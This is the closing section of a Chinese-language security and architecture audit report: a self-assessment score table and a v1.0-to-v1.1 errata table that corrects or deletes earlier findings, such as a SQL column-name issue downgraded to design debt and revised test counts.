| 安全发现准确性 | 8/10       | P0 三项全部属实；SQL 动态列名已修正为设计债务；detectDangerousCommand 策略分裂补充 |
| 架构发现准确性 | 7/10       | God File 准确；desktop->server 和路由重复两条错误发现已删除                        |
| 代码质量分析   | 7/10       | 主要发现属实，测试计数已修正，部分上下文缺失                                       |
| 数据准确性     | 6/10       | 测试数量、依赖类型偏差已修正                                                       |
| 改进建议质量   | 8/10       | 具体、可落地，但需过滤已删除的发现                                                 |
| **综合**       | **7.2/10** | 有价值的报告，交叉验证后可信度提升                                                 |

### E. 勘误表（v1.0 -> v1.1）

| 条目                         | 原报告 (v1.0)       | 修正后 (v1.1)              | 修正原因                                                                                                                                             |
| ---------------------------- | ------------------- | -------------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------- |
| `desktop->server` 跨层依赖   | `[中]` 指控         | **删除**                   | `@cabinet/server` 在 `devDependencies` 中，仅用于构建脚本，不进入前端 bundle                                                                         |
| 路由重复注册 `/api/projects` | `[高]` 覆盖风险     | **删除**                   | `deliverablesRouter` 和 `documentsRouter` 内部定义了 `/:id/deliverables` 和 `/:id/documents` 路径，挂载到 `/api/projects` 是有意的 REST 嵌套资源设计 |
| SQL 动态列名拼接             | `[中] SQL 注入风险` | `[低] 设计债务`            | `fieldMap` 是硬编码白名单，当前不可利用；但耦合模式存在未来风险                                                                                      |
| `@cabinet/ui` 测试数         | `0`                 | `1`                        | 遗漏了 `packages/ui/src/__tests__/components.test.tsx`                                                                                               |
| 测试文件总数                 | `44`                | `57`                       | 搜索口径漏掉了 `.tsx` 扩展名和部分目录                                                                                                               |
| `detectDangerousCommand`     | `[低] 重复定义`     | `[中] 安全策略分裂`        | 两版本规则集不一致（`capabilities.ts` 12 条 vs `secretary.ts` 7 条），不同调用路径防护强度不同                                                       |
| 正面缓解措施                 | 未提及              | 补充"已做对的缓解措施"小节 | `timingSafeEqual`、`needsRehash`、`fieldMap` 白名单、AES-256-GCM 正确实现                                                                            |
| 综合可信度                   | 自评未给出          | **7.2/10**                 | 基于评估反馈修正后的自评                                                                                                                             |

---

_报告结束。建议团队优先处理 P0 安全项，随后进入架构债务清偿阶段。_
